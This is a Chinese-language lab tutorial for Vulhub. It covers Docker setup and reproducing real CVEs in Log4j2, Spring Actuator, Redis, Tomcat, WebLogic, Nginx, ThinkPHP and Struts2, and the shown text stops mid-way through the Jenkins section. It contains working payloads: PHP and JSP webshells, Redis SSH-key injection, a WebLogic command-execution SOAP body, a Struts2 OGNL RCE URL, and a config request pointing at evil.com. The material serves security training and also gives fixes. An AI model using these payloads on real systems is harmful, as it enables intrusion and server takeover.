# 靶场9：Vulhub — 一键搭建的真实漏洞环境集合

> **难度等级**：🟠 高等
> **预计学习时间**：180 分钟
> **学习目标**：
> - 了解 Vulhub 的架构与漏洞分类
> - 掌握 Vulhub 的安装与使用方法
> - 能够独立复现至少 10 个经典漏洞
> - 理解常见中间件、框架漏洞的原理
> - 掌握漏洞复现的方法论与思维方式

---

## 一、Vulhub 介绍

### 1.1 什么是 Vulhub

Vulhub 是一个基于 **Docker-Compose** 的漏洞环境集合，由国内安全团队 **Phith0n** 发起并维护。它的目标是让安全研究者能够快速、便捷地搭建各种真实漏洞环境，进行漏洞复现和学习。

与 WebGoat、DVWA 等"教学型靶场"不同，Vulhub 中的环境都是 **真实的软件版本 + 真实的漏洞**，而不是模拟的漏洞场景。这意味着你在 Vulhub 中复现的每一个漏洞，都可能在真实世界的系统中遇到。

> 💡 **大白话说Vulhub——从"假靶子"到"真战场"**
>
> 之前的靶场（DVWA、SQLi-Labs等）都是**教学靶场**——漏洞是"人刻意写出来的"。
>
> Vulhub完全不同——它给你的是**真实历史版本的真实漏洞**。比如：
> - Weblogic 10.3.6.0 有一个反序列化漏洞（CVE-2017-10271）→ Vulhub给你这个真实版本
> - Struts2 2.3.32 有远程代码执行漏洞（S2-045）→ Vulhub给你这个真实版本
>
> 这意味着：你在Vulhub里成功的每一个攻击，**理论上都可以在真实世界中使用**。
>
> **学习建议**：不要试图打完Vulhub的所有环境（200多个）。正确的做法是：
> 1. 先选5-10个经典CVE（如Struts2系列、Weblogic系列、Log4j）
> 2. 每个环境先自己尝试，再看官方Writeup
> 3. 复现成功后，思考"如果回到真实环境中，我该怎么发现这个漏洞？"
>
> Vulhub是把"理论"变成"实战能力"的关键一步。

### 1.2 Vulhub 的特点

| 特点 | 说明 |
|------|------|
| **真实漏洞** | 使用真实的软件版本，漏洞都是真实存在的 CVE |
| **一键启动** | Docker Compose 一键搭建，无需复杂配置 |
| **数量众多** | 200+ 漏洞环境，覆盖各种类型 |
| **分类清晰** | 按软件类型分类，方便查找 |
| **文档完善** | 每个漏洞都有详细的复现文档 |
| **持续更新** | 社区活跃，新漏洞快速跟进 |
| **中文友好** | 官方文档为中文，国内用户友好 |

### 1.3 Vulhub 与其他靶场的区别

| 维度 | WebGoat/DVWA 等教学靶场 | Vulhub 真实漏洞环境 |
|------|------------------------|-------------------|
| 漏洞类型 | 模拟的教学场景 | 真实的 CVE 漏洞 |
| 软件版本 | 特制的漏洞版本 | 真实历史版本 |
| 学习方式 | 课程引导式学习 | 自主探索式学习 |
| 难度 | 循序渐进 | 跨度大，从简单到困难 |
| 适合阶段 | 入门学习 | 进阶提升 |
| 实战价值 | 理解原理 | 贴近真实攻防 |

### 1.4 适合人群

- 已经掌握 Web 安全基础，想要进阶的学习者
- 渗透测试工程师，用于验证漏洞和测试工具
- 安全研究者，进行漏洞分析和研究
- CTF 选手，积累漏洞知识和利用经验
- 安全开发人员，了解真实漏洞以编写更安全的代码

---

## 二、环境搭建

### 2.1 前置条件

在使用 Vulhub 之前，需要安装以下软件：

- **Docker**：容器运行时
- **Docker Compose**：容器编排工具
- **Git**：用于下载 Vulhub 源码

### 2.2 Docker 安装

**Ubuntu/Debian 系统**：

```bash
# 更新软件包索引
sudo apt update

# 安装依赖
sudo apt install -y apt-transport-https ca-certificates curl gnupg-agent software-properties-common

# 添加 Docker 官方 GPG 密钥
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -

# 添加 Docker 软件源
sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"

# 安装 Docker
sudo apt update
sudo apt install -y docker-ce docker-ce-cli containerd.io

# 启动 Docker
sudo systemctl start docker
sudo systemctl enable docker

# 将当前用户加入 docker 组（免 sudo）
sudo usermod -aG docker $USER
```

**CentOS/RHEL 系统**：

```bash
# 安装依赖
sudo yum install -y yum-utils device-mapper-persistent-data lvm2

# 添加 Docker 软件源
sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo

# 安装 Docker
sudo yum install -y docker-ce docker-ce-cli containerd.io

# 启动 Docker
sudo systemctl start docker
sudo systemctl enable docker
```

**验证安装**：

```bash
docker --version
docker run hello-world
```

### 2.3 Docker Compose 安装

```bash
# 下载 Docker Compose
sudo curl -L "https://github.com/docker/compose/releases/download/v2.20.0/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose

# 添加执行权限
sudo chmod +x /usr/local/bin/docker-compose

# 验证安装
docker-compose --version
```

> 注意：新版本的 Docker Desktop 已内置 Compose 插件，可使用 `docker compose` 命令。

### 2.4 Vulhub 下载与使用

```bash
# 克隆 Vulhub 仓库
git clone https://github.com/vulhub/vulhub.git

# 进入目录
cd vulhub

# 查看目录结构
ls
```

Vulhub 的目录结构如下：

```
vulhub/
├── activemq/         # ActiveMQ 漏洞
├── apache/           # Apache 服务器漏洞
├── apereo-cas/       # Apereo CAS 漏洞
├── aria2/            # Aria2 漏洞
├── baselinux/        # 基础 Linux 环境
├── coldfusion/       # ColdFusion 漏洞
├── confluence/       # Confluence 漏洞
├── discuz/           # Discuz 漏洞
├── django/           # Django 框架漏洞
├── docker/           # Docker 相关漏洞
├── drupal/           # Drupal CMS 漏洞
├── ecshop/           # ECShop 漏洞
├── elasticsearch/    # Elasticsearch 漏洞
├── fastjson/         # Fastjson 漏洞
├── ffmpeg/           # FFmpeg 漏洞
├── flink/            # Flink 漏洞
├── ghostscript/      # Ghostscript 漏洞
├── gitlab/           # GitLab 漏洞
├── goahead/          # GoAhead 漏洞
├── gogs/             # Gogs 漏洞
├── hadoop/           # Hadoop 漏洞
├── httpd/            # Apache HTTPD 漏洞
├── imagetragick/     # ImageMagick 漏洞
├── influxdb/         # InfluxDB 漏洞
├── jackson/          # Jackson 漏洞
├── jboss/            # JBoss 中间件漏洞
├── jenkins/          # Jenkins 漏洞
├── jira/             # Jira 漏洞
├── joomla/           # Joomla CMS 漏洞
├── jupyter/          # Jupyter 漏洞
├── kibana/           # Kibana 漏洞
├── kong/             # Kong 漏洞
├── laravel/          # Laravel 框架漏洞
├── libssh/           # libssh 漏洞
├── log4j/            # Log4j2 漏洞
├── lucene-solr/      # Solr 漏洞
├── metabase/         # Metabase 漏洞
├── mysql/            # MySQL 数据库漏洞
├── nacos/            # Nacos 漏洞
├── neo4j/            # Neo4j 漏洞
├── nexus/            # Nexus 漏洞
├── nginx/            # Nginx 服务器漏洞
├── node/             # Node.js 漏洞
├── ofbiz/            # Apache OFBiz 漏洞
├── openssh/          # OpenSSH 漏洞
├── opentsdb/         # OpenTSDB 漏洞
├── oracle/           # Oracle 数据库漏洞
├── php/              # PHP 相关漏洞
├── phpmyadmin/       # phpMyAdmin 漏洞
├── postgres/         # PostgreSQL 漏洞
├── python/           # Python 相关漏洞
├── rabbitmq/         # RabbitMQ 漏洞
├── redis/            # Redis 漏洞
├── ricoh/            # Ricoh 打印机漏洞
├── saltstack/        # SaltStack 漏洞
├── samba/            # Samba 漏洞
├── scrapy/           # Scrapy 漏洞
├── shiro/            # Shiro 反序列化漏洞
├── smarty/           # Smarty 模板引擎漏洞
├── solr/             # Solr 搜索引擎漏洞
├── spark/            # Spark 漏洞
├── spring/           # Spring 框架漏洞
├── struts2/          # Struts2 漏洞
├── supervisord/      # Supervisor 漏洞
├── thinkphp/         # ThinkPHP 框架漏洞
├── tomcat/           # Tomcat 中间件漏洞
├── unomi/            # Unomi 漏洞
├── vault/            # HashiCorp Vault 漏洞
├── weblgic/          # WebLogic 中间件漏洞
├── webmin/           # Webmin 漏洞
├── wordpress/        # WordPress CMS 漏洞
├── xunsearch/        # Xunsearch 漏洞
├── yapi/             # YApi 漏洞
├── zabbix/           # Zabbix 漏洞
└── zookeeper/        # Zookeeper 漏洞
```

每个漏洞目录下通常包含：
- `docker-compose.yml`：Docker Compose 配置文件
- `README.md` / `README.zh-cn.md`：漏洞说明文档
- 其他配置文件

---

## 三、使用方法

### 3.1 基本操作流程

Vulhub 的使用非常简单，标准流程如下：

**步骤 1：进入漏洞目录**

```bash
cd vulhub/漏洞类型/漏洞名称
# 例如：cd vulhub/log4j/CVE-2021-44228
```

**步骤 2：启动环境**

```bash
docker-compose up -d
```

参数说明：
- `up`：创建并启动容器
- `-d`：后台运行

**步骤 3：访问目标**

环境启动后，根据文档中的说明访问对应的端口和路径。

通常可以用以下命令查看端口映射：

```bash
docker-compose ps
```

**步骤 4：漏洞复现**

按照文档中的步骤进行漏洞测试和利用。

**步骤 5：销毁环境**

用完后销毁环境，释放资源：

```bash
docker-compose down
```

如果想彻底删除镜像：
```bash
docker-compose down --rmi all
```

### 3.2 常用命令速查

| 命令 | 说明 |
|------|------|
| `docker-compose up -d` | 启动环境 |
| `docker-compose ps` | 查看容器状态 |
| `docker-compose logs` | 查看容器日志 |
| `docker-compose exec <服务名> bash` | 进入容器 |
| `docker-compose down` | 停止并删除容器 |
| `docker-compose down -v` | 删除数据卷 |
| `docker-compose restart` | 重启环境 |
| `docker-compose build` | 重新构建镜像 |

### 3.3 常见问题

**Q：镜像拉取失败？**
A：可以配置 Docker 镜像加速器，如阿里云、中科大等。

**Q：端口冲突怎么办？**
A：修改 `docker-compose.yml` 中的端口映射，或者先停止占用端口的服务。

**Q：环境启动后访问不了？**
A：使用 `docker-compose ps` 查看容器状态，用 `docker-compose logs` 查看日志排查问题。

**Q：如何更新 Vulhub？**
A：在 vulhub 根目录执行 `git pull` 即可。

---

## 四、漏洞分类概览

### 4.1 Web 服务器类

| 软件 | 代表漏洞 | 危害 |
|------|---------|------|
| Nginx | 解析漏洞、目录遍历、CRLF 注入 | 信息泄露、代码执行 |
| Apache HTTPD | 解析漏洞、路径遍历 | 代码执行、信息泄露 |
| IIS | 解析漏洞、PUT 上传 | 代码执行 |
| Lighttpd | 各种解析漏洞 | 代码执行 |

### 4.2 Web 应用类

| 软件/CMS | 代表漏洞 | 危害 |
|----------|---------|------|
| WordPress | 各种插件漏洞、RCE | 代码执行、数据泄露 |
| Drupal | Drupalgeddon（CVE-2018-7600等） | 远程代码执行 |
| Joomla | 各种组件漏洞 | 代码执行、SQL 注入 |
| Discuz | 各种版本漏洞 | SQL 注入、GetShell |
| ECShop | SQL 注入、代码执行 | 数据泄露、GetShell |
| Typecho | 反序列化、安装漏洞 | 代码执行 |
| PHPCMS | 各种漏洞 | SQL 注入、GetShell |
| ThinkPHP | 多语言 RCE、SQL 注入 | 远程代码执行 |
| Laravel | 反序列化、Debug 模式泄露 | 代码执行、信息泄露 |
| Django | 调试模式泄露、SQL 注入 | 信息泄露、数据泄露 |
| Struts2 | S2-001 到 S2-062 系列 | 远程代码执行 |
| Spring | Spring Boot Actuator、Spring Cloud | 代码执行、信息泄露 |

### 4.3 数据库类

| 数据库 | 代表漏洞 | 危害 |
|--------|---------|------|
| MySQL | 身份认证绕过、UDF 提权 | 未授权访问、提权 |
| Redis | 未授权访问、主从复制 RCE | 数据泄露、代码执行 |
| MongoDB | 未授权访问 | 数据泄露 |
| PostgreSQL | 各种 CVE | 代码执行、提权 |
| Elasticsearch | 未授权访问、Groovy 脚本执行 | 数据泄露、代码执行 |
| InfluxDB | 未授权访问 | 数据泄露 |

### 4.4 中间件类

| 中间件 | 代表漏洞 | 危害 |
|--------|---------|------|
| Tomcat | 弱口令 + WAR 部署、PUT 上传 | 远程代码执行 |
| JBoss | 反序列化、JMX 控制台 | 远程代码执行 |
| WebLogic | 反序列化系列（CVE-2019-2725等） | 远程代码执行 |
| WebSphere | 反序列化、各种 CVE | 远程代码执行 |
| Jenkins | 未授权访问、Groovy 脚本 | 远程代码执行 |
| Shiro | 反序列化（RememberMe） | 远程代码执行 |
| Fastjson | 反序列化系列 | 远程代码执行 |
| Log4j2 | JNDI 注入（CVE-2021-44228） | 远程代码执行 |

### 4.5 编程语言类

| 语言 | 代表漏洞 | 危害 |
|------|---------|------|
| PHP | 各种版本 RCE、文件包含 | 代码执行 |
| Java | 各种反序列化、表达式注入 | 代码执行 |
| Python | 反序列化、模板注入 | 代码执行 |
| Node.js | 原型链污染、模块注入 | 代码执行 |

### 4.6 操作系统/服务类

| 服务 | 代表漏洞 | 危害 |
|------|---------|------|
| OpenSSH | 用户枚举、命令注入 | 权限提升 |
| Samba | 永恒之红（CVE-2017-7494） | 远程代码执行 |
| SaltStack | 未授权访问 + RCE | 远程代码执行 |
| rsync | 未授权访问 | 数据泄露 |
| Docker | 未授权访问 | 容器逃逸、主机控制 |

### 4.7 其他

| 软件 | 代表漏洞 | 危害 |
|------|---------|------|
| GitLab | 各种 CVE | 代码执行、数据泄露 |
| Confluence | OGNL 注入、模板注入 | 远程代码执行 |
| Jira | 各种 CVE | 信息泄露、代码执行 |
| GitLab/GitHub | SSRF、命令注入 | 内网渗透、代码执行 |
| Solr | 各种 RCE | 远程代码执行 |
| Kafka | 未授权访问 | 数据泄露 |
| Zookeeper | 未授权访问 | 数据泄露 |
| Nacos | 未授权访问 | 配置泄露 |

---

## 五、经典漏洞详解

> 💡 **大白话说经典漏洞的学习策略——"不要贪多，精读5个就够了"**
>
> Vulhub里有200多个漏洞环境，全部打完是不现实的。正确的方法是**精读5-10个经典CVE，以不变应万变**。
>
> 选漏洞的标准：
> 1. **影响范围大**：Log4j2（影响整个Java生态）、Struts2系列（无数政企网站中招）
> 2. **漏洞类型有代表性**：反序列化（WebLogic）、未授权访问（Redis）、框架漏洞（ThinkPHP）
> 3. **在真实护网中高频出现**：护网行动中被利用最多的那些漏洞
>
> 每复现一个漏洞，不要止步于"拿到了Shell"。要深入问自己三个问题：
> - **这个漏洞的本质是什么？**（JNDI注入？反序列化？解析差异？）
> - **如果回到真实环境，我该怎么发现它？**（用什么工具？看什么特征？）
> - **修复方案是什么？**（只升级？加配置？还是改代码？）
>
> 能回答这三个问题，才算真正"学会"了一个漏洞。

### 5.1 Apache Log4j2 远程代码执行（CVE-2021-44228）

**漏洞原理**：

Log4j2 是 Apache 的一个 Java 日志框架。当日志中包含 `${jndi:ldap://...}` 这样的字符串时，Log4j2 会通过 JNDI 去加载远程的类，导致远程代码执行。

> 💡 **大白话说Log4j2——"日志里的一句话，把整个服务器卖给了黑客"**
>
> Log4j2漏洞被称为"核弹级"漏洞，不是没有原因的。用生活场景来理解：
>
> 日志就像一个记录本，服务器把各种事情写进去："用户张三登录了"、"IP:1.2.3.4访问了首页"。正常情况下，这些只是文字记录。
>
> 但Log4j2有个"贴心"的功能：如果日志里出现了 `${xxx}` 这种格式，它就会去"查找"这个xxx代表的东西。就像你写了个便签"今天花了${昨天的开销+10元}"，助手就会自动算出金额。
>
> 问题是：`${jndi:ldap://黑客服务器/恶意代码}` 这行字被写到日志里时，Log4j2不是把它当文字记录，而是"执行"了它——去黑客服务器下载代码并运行！
>
> **这有多可怕？** 只要你能让你的输入出现在日志里（比如你的用户名、User-Agent、搜索关键词），你就控制了整个服务器。而且：
> - 影响面极广：几乎所有用Java的系统都可能受影响（Spring Boot、Elasticsearch、Kafka…）
> - 利用门槛极低：只需要一段字符串，不需要任何复杂技术
> - 触发场景极多：任何能让你控制的内容进入日志的地方都可以利用
>
> 这就是为什么2021年底这个漏洞让全球安全圈如临大敌——它就像一个"万能钥匙"，而且这把钥匙能轻易复制给任何人。

**影响版本**：
- Log4j 2.0-beta9 到 2.14.1

**环境启动**：

```bash
cd vulhub/log4j/CVE-2021-44228
docker-compose up -d
```

环境启动后访问 `http://your-ip:8983`（Solr 管理界面）。

**利用步骤**：

**步骤 1：准备恶意 LDAP 服务**

使用 marshalsec 或 JNDI-Injection-Exploit 工具启动 LDAP 服务：

```bash
# 使用 JNDI-Injection-Exploit
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "命令" -A "攻击者IP"
```

**步骤 2：发送 Payload**

将 Payload 插入到会被记录到日志的地方：

```
http://your-ip:8983/solr/admin/cores?action=${jndi:ldap://攻击者IP:1389/abc}
```

也可以将 Payload 放在 HTTP 头中（如 User-Agent、X-Forwarded-For 等）。

**步骤 3：验证漏洞**

如果服务器访问了我们的 LDAP 服务，说明漏洞存在，并且可以执行任意代码。

**修复建议**：
- 升级 Log4j2 到 2.17.1 或更高版本
- 临时缓解：设置 `log4j2.formatMsgNoLookups=true`
- 限制出网，禁止服务器访问外部 LDAP/RMI 服务

### 5.2 Spring Boot Actuator 信息泄露 + JNDI 注入

**漏洞原理**：

Spring Boot Actuator 是 Spring Boot 的监控端点，如果配置不当会暴露敏感信息（如 env、heapdump、trace 等）。结合其他漏洞（如 JNDI 注入）可以导致 RCE。

> 💡 **大白话说Spring Boot Actuator——"把服务器体检报告贴在了大门外"**
>
> Spring Boot Actuator是一个"应用健康检查"功能——相当于服务器定期做体检，把各项指标记录下来。正常来说，这些体检报告只有运维人员在内网才能看。
>
> 但如果配置不当，这些端点暴露在了公网上，效果就是——**你把服务器的体检报告、身份证号、银行卡密码全部贴在了大门外的公告栏上**。
>
> 具体来说，攻击者访问以下端点就能获得的信息：
> - `/actuator/env` → 服务器用了什么数据库？数据库密码是什么？API密钥是多少？
> - `/actuator/heapdump` → 下载整个内存快照，里面可能有人刚登录过留下的密码
> - `/actuator/mappings` → 服务器有哪些接口？哪些可以不需要权限访问？
>
> 更可怕的是，结合某些配置问题（如Spring Cloud），攻击者不仅能看到信息，还能通过Actuator修改配置、注入恶意代码——**从"偷看体检报告"变成了"给服务器打毒针"**。
>
> 这是典型的"信息泄露→权限提升"攻击链：先通过Actuator收集信息，再利用收集到的凭据/配置进一步攻击。

**影响版本**：
- Spring Boot 1.x（部分配置）
- Spring Boot 2.x（配置不当时）

**环境启动**：

```bash
cd vulhub/spring/CVE-2018-1270
docker-compose up -d
```

**利用步骤**：

**步骤 1：发现 Actuator 端点**

访问以下路径检查是否存在：

```
/actuator
/actuator/env
/actuator/heapdump
/actuator/trace
/actuator/mappings
```

**步骤 2：信息收集**

- `/actuator/env`：获取环境变量，可能包含数据库密码、密钥等
- `/actuator/heapdump`：下载堆转储文件，分析获取敏感信息
- `/actuator/mappings`：获取所有 URL 映射

**步骤 3：结合 JNDI 注入 RCE**

如果存在 Spring Cloud 的配置不当，可以通过 JNDI 注入实现 RCE：

```
POST /actuator/env
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://evil.com/"}
```

然后刷新配置：

```
POST /actuator/refresh
```

**修复建议**：
- 禁用不必要的 Actuator 端点
- 配置安全认证，保护 Actuator 端点
- 不要将 Actuator 暴露在公网
- 升级 Spring Boot 到最新版本

### 5.3 Redis 未授权访问

**漏洞原理**：

Redis 默认配置下没有密码认证，且绑定在 0.0.0.0 上，如果暴露在公网，攻击者可以未授权访问 Redis 服务器，进而写入 WebShell 或 SSH 公钥获取服务器权限。

> 💡 **大白话说Redis未授权访问——"你家保险柜没设密码，还敞着门放在马路边"**
>
> Redis是一个高性能的缓存数据库，它默认的设计理念是"在可信内网使用，不需要密码"。但这个假设在真实世界中经常不成立——很多运维人员直接把Redis部署在公网可访问的地方，而且忘了设密码。
>
> 攻击者连上Redis后能做的事：
> - **偷看数据**：`KEYS *`看所有键，`GET key`读数据——你的缓存里有什么？用户session？验证码？
> - **写文件**：通过`CONFIG SET dir`设置目录，`CONFIG SET dbfilename`设置文件名，`SAVE`保存 → 就能在服务器任意位置写入内容
> - **写WebShell**：把文件写到Web目录 → 直接获取WebShell
> - **写SSH公钥**：把自己的SSH公钥写到 `/root/.ssh/authorized_keys` → 免密码SSH登录服务器
> - **主从复制RCE**：利用Redis的主从复制功能，加载恶意模块执行系统命令
>
> 修复方法超简单：**设密码**（`requirepass`）+ **绑定内网IP**（不要bind 0.0.0.0）。就两行配置的事，但很多服务器就栽在这两行配置上。

**影响版本**：
- 所有版本（配置不当导致）

**环境启动**：

```bash
cd vulhub/redis/4-unacc
docker-compose up -d
```

**利用步骤**：

**步骤 1：连接 Redis**

```bash
redis-cli -h your-ip
```

如果不需要密码就能连接，说明存在未授权访问。

**步骤 2：获取信息**

```
INFO          # 查看服务器信息
KEYS *        # 查看所有键
GET keyname   # 获取键值
CONFIG GET *  # 查看配置
```

**步骤 3：写入 WebShell**

```bash
# 连接 Redis
redis-cli -h your-ip

# 设置 Web 目录
config set dir /var/www/html

# 设置文件名
config set dbfilename shell.php

# 设置内容
set x "<?php eval(\$_REQUEST['cmd']); ?>"

# 保存
save
```

然后访问 `http://your-ip/shell.php?cmd=phpinfo();`

**步骤 4：写入 SSH 公钥（Linux）**

```bash
# 生成密钥对
ssh-keygen -t rsa

# 将公钥写入文件（前后加换行）
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt

# 写入 Redis
cat key.txt | redis-cli -h your-ip -x set pubkey

# 设置路径和文件名
redis-cli -h your-ip config set dir /root/.ssh
redis-cli -h your-ip config set dbfilename authorized_keys
redis-cli -h your-ip save

# SSH 登录
ssh -i ~/.ssh/id_rsa root@your-ip
```

**步骤 5：主从复制 RCE**

Redis 4.x/5.x 可以通过主从复制加载恶意模块实现 RCE：

使用工具：https://github.com/n0b0dyCN/redis-rogue-server

```bash
python3 redis-rogue-server.py --rhost target-ip --rport 6379 --lhost attacker-ip
```

**修复建议**：
- 配置 Redis 密码（`requirepass`）
- 绑定内网 IP，不要暴露在公网
- 以低权限运行 Redis
- 修改默认端口 6379
- 禁用或重命名 CONFIG 等危险命令

### 5.4 Tomcat 弱口令 + WAR 包部署

**漏洞原理**：

Tomcat 的 Manager 后台如果使用弱密码，攻击者可以登录后部署 WAR 包（包含 JSP 木马），从而获取服务器权限。

**影响版本**：
- 所有版本（配置不当导致）

**环境启动**：

```bash
cd vulhub/tomcat/tomcat8
docker-compose up -d
```

**利用步骤**：

**步骤 1：发现 Manager 后台**

访问 `http://your-ip:8080/manager/html`，如果弹出认证框，说明存在 Manager 应用。

**步骤 2：暴力破解密码**

常见的弱密码：
- tomcat / tomcat
- admin / admin
- manager / manager
- tomcat / s3cret

可以使用 Hydra 或 Burp 爆破：

```bash
hydra -L users.txt -P pass.txt -s 8080 target http-get /manager/html
```

**步骤 3：制作 WAR 木马**

```bash
# 创建 JSP 木马
echo '<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); %>' > shell.jsp

# 打包成 WAR
jar -cvf shell.war shell.jsp
```

**步骤 4：部署 WAR 包**

登录 Manager 后台，在 "WAR file to deploy" 处上传 shell.war。

部署后访问：`http://your-ip:8080/shell/shell.jsp?cmd=id`

**修复建议**：
- 使用强密码
- 限制 Manager 应用的访问 IP
- 不需要时禁用 Manager 应用
- 修改默认路径
- 启用 HTTPS

### 5.5 WebLogic 反序列化（CVE-2019-2725）

**漏洞原理**：

WebLogic 的 wls9_async_response 组件存在反序列化漏洞，攻击者可以通过发送恶意 XML 数据触发反序列化，执行任意代码。

> 💡 **大白话说WebLogic反序列化——"快递签收后自动拆箱的机关被触发了"**
>
> WebLogic反序列化漏洞是护网行动中最常被利用的漏洞之一。它的原理和前面讲的PHP反序列化类似，但在Java中更复杂也更危险。
>
> 用"快递接收处"来理解：
> 1. WebLogic服务器有个"异步响应组件"（wls9_async_response），它的作用是接收外部发来的数据（XML格式），自动处理
> 2. 这个组件就像工厂的"自动分拣机器"，收到快递就自动拆箱、分类、上架
> 3. 正常情况下，快递里是业务数据
> 4. 攻击者发来的快递里装的不是数据，而是一个"机器人"（序列化后的恶意Java对象）
> 5. 自动分拣机器人拆开快递，把"机器人"激活了 → 代码被执行
>
> **为什么Java反序列化漏洞如此普遍？**
> 因为Java的反序列化机制本身就是为"信任环境"设计的（同一台机器的不同组件之间传数据），不像XML/JSON那样只是纯数据。反序列化会**重建对象并执行对象构造过程中的代码**——这就给了攻击者"在拆快递的过程中做手脚"的机会。
>
> WebLogic、WebSphere、JBoss、Shiro、Fastjson——这些Java中间件和框架都出过反序列化漏洞，不是因为他们写代码不够好，而是"反序列化"这个机制本身就带有危险基因。

**影响版本**：
- Oracle WebLogic Server 10.3.6.0.0
- Oracle WebLogic Server 12.1.3.0.0

**环境启动**：

```bash
cd vulhub/weblogic/CVE-2019-2725
docker-compose up -d
```

环境启动需要 2-5 分钟。

**利用步骤**：

**步骤 1：验证漏洞**

访问以下路径，看是否返回 200：

```
http://your-ip:7001/_async/AsyncResponseService
```

**步骤 2：构造 Payload**

使用 ysoserial 生成反序列化 Payload：

```bash
java -jar ysoserial.jar Jdk7u21 "ping xxx.ceye.io" > payload.ser
```

然后将 Payload 嵌入到 XML 中：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>id</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body>
</soapenv:Envelope>
```

**步骤 3：发送 Payload**

```bash
curl -X POST -H "Content-Type: text/xml" -d @payload.xml http://your-ip:7001/_async/AsyncResponseService
```

**步骤 4：使用工具自动化**

也可以使用现成的检测工具：
- WebLogicScan
- wls-scan
- 各种 Python POC 脚本

**修复建议**：
- 及时安装 Oracle 官方安全补丁
- 删除或禁用 wls9_async_response 组件
- 限制 WebLogic 管理端口的访问
- 升级到最新版本

### 5.6 Nginx 解析漏洞 / 目录遍历

#### 5.6.1 Nginx 文件名逻辑漏洞（CVE-2013-4547）

**漏洞原理**：

Nginx 在处理带有空格和 `%00` 的 URL 时存在解析问题，导致文件上传后可以通过构造 URL 触发 PHP 解析。

**影响版本**：
- Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7

**环境启动**：

```bash
cd vulhub/nginx/CVE-2013-4547
docker-compose up -d
```

**利用步骤**：

1. 上传一个图片文件（内容为 PHP 代码），文件名如 `test.jpg`
2. 访问 `http://your-ip/test.jpg...%00.php`（注意中间有空格）
3. Nginx 会将其作为 PHP 文件解析，执行代码

**修复建议**：升级 Nginx 到最新版本。

#### 5.6.2 Nginx 目录遍历（insecure-configuration）

**漏洞原理**：

Nginx 的 alias 配置不当，`/files../` 可以绕过限制，实现目录遍历。

**配置示例**：
```nginx
location /files {
    alias /home/;
}
```

访问 `/files../etc/passwd` 可以读取 `/etc/passwd`。

**修复建议**：在 location 末尾加 `/`，即 `location /files/`。

### 5.7 ThinkPHP 多语言 RCE

**漏洞原理**：

ThinkPHP 的多语言功能在检测语言时，会调用 include 包含语言文件，如果语言参数可控，就会导致文件包含甚至远程代码执行。

**影响版本**：
- ThinkPHP 6.0.0 ~ 6.0.13
- ThinkPHP 5.0.x ~ 5.2.x（部分版本）

**环境启动**：

```bash
cd vulhub/thinkphp/multi-language-rce
docker-compose up -d
```

**利用步骤**：

**步骤 1：验证漏洞**

访问：

```
http://your-ip/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=phpinfo()?>+/var/www/html/shell.php
```

或者利用 pearcmd.php 写入 Shell：

```
?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=eval($_POST[1])?>+/tmp/shell.php
```

**步骤 2：包含日志文件 Getshell**

如果服务器开启了日志，也可以包含日志文件：

1. 先在 URL 中注入 PHP 代码（会被记录到日志）
2. 然后用 lang 参数包含日志文件
3. 执行 PHP 代码

**修复建议**：
- 升级 ThinkPHP 到最新版本
- 关闭多语言功能（如果不需要）
- 对 lang 参数进行严格过滤

### 5.8 S2-061 Struts2 OGNL 注入（CVE-2020-17530）

**漏洞原理**：

Struts2 在处理某些 OGNL 表达式时，对用户输入的验证不充分，导致 OGNL 表达式注入，攻击者可以执行任意代码。

**影响版本**：
- Struts 2.0.0 - Struts 2.5.25

**环境启动**：

```bash
cd vulhub/struts2/s2-061
docker-compose up -d
```

**利用步骤**：

**步骤 1：构造 Payload**

```
http://your-ip:8080/?id=%25{+%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS.%23process%3d%40java.lang.Runtime%40getRuntime().exec(%23parameters.cmd%5b0%5d).getInputStream()%2c%23reader%3dnew+java.io.InputStreamReader(%23process)%2c%23scanner%3dnew+java.util.Scanner(%23reader)%2c%23result%3d%23scanner.useDelimiter(%22%5c%5c%5c%5cA%22).next()%2c%23result}&cmd=id
```

**步骤 2：使用工具检测**

```bash
# 使用 Struts2-Scan 工具
python3 Struts2Scan.py -u http://your-ip:8080/
```

**修复建议**：
- 升级 Struts2 到 2.5.26 或更高版本
- 尽量减少 OGNL 表达式的使用
- 对用户输入进行严格的验证和过滤

### 5.9 Jenkins 未授权访问 + 命令执行

**漏洞原理**：

Jenkins 默认配置下，如果没有启用安全认证，任何人都可以访问 Jenkins 并执行脚本（Script Console），进而执行系统命令。

**影响版本**：
- 所有版本（配置不当导致）

**环境启动**：

```bash
cd vulhub/jenkins/CVE-2017-1000353
docker-compose up -d
```

或者使用未授权访问环境：

```bash
cd vulhub/jenkins/unacc
docker-compose up -d
```

**利用步骤**：

**步骤 1：发现未授权访问**

访问 `http://your-ip:8080`，如果不需要登录就能看到 Jenkins 界面，说明存在未授权访问。

**步骤 2：使用 Script Console**

访问 `http://your-ip:8080/script`，在输入框中执行 Groovy 脚本：

```groovy
def command = "id"
